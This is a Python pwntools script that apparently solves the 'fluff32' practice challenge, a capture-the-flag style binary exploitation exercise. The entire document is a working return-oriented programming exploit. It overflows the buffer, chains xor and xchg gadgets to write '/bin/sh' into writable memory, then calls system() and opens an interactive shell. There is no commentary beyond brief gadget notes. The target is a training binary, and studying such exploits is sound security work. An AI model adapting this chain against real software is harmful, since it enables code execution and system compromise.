from pwn import *

elf = ELF('fluff32',checksec=False)

addr = 0x0804a0f0
string = '/bin/sh\x00'

#0x08048693: mov dword ptr [ecx], edx; pop ebp; pop ebx; xor byte ptr [ecx], bl; ret;
#0x08048689: xchg edx, ecx; pop ebp; mov edx, 0xdefaced0; ret;
#0x08048697: xor byte ptr [ecx], bl; ret;
#0x0804867b: xor edx, ebx; pop ebp; mov edi, 0xdeadbabe; ret;
#0x080483e1: pop ebx; ret;
#0x08048671: xor edx, edx; pop esi; mov ebp, 0xcafebabe; ret;

xor_edx_edx = 0x08048671
pop_ebx = 0x080483e1
xor_edx_ebx = 0x0804867b
xchg = 0x08048689
mov_ecx_edx = 0x08048693

payload = cyclic(44)
payload += p32(xor_edx_edx) + 'A'*4 # edx = 0
payload += p32(pop_ebx) + p32(addr)
payload += p32(xor_edx_ebx) + 'A'*4
payload += p32(xchg) + 'A'*4 # ecx = edx
payload += p32(xor_edx_edx) + 'A'*4 # edx = 0
payload += p32(pop_ebx) + 'nbin'
payload += p32(xor_edx_ebx) + 'A'*4
payload += p32(mov_ecx_edx) + 'A'*8

payload += p32(xor_edx_edx) + 'A'*4 # edx = 0
payload += p32(pop_ebx) + p32(addr+4)
payload += p32(xor_edx_ebx) + 'A'*4
payload += p32(xchg) + 'A'*4 # ecx = edx
payload += p32(xor_edx_edx) + 'A'*4 # edx = 0
payload += p32(pop_ebx) + 'nsh\x00'
payload += p32(xor_edx_ebx) + 'A'*4
payload += p32(mov_ecx_edx) + 'A'*8

payload += p32(elf.symbols['system']) +'A'*4+ p32(addr)+'\x00'*5

print payload 
r = process(elf.path)

r.sendlineafter("> ",payload)

r.interactive()
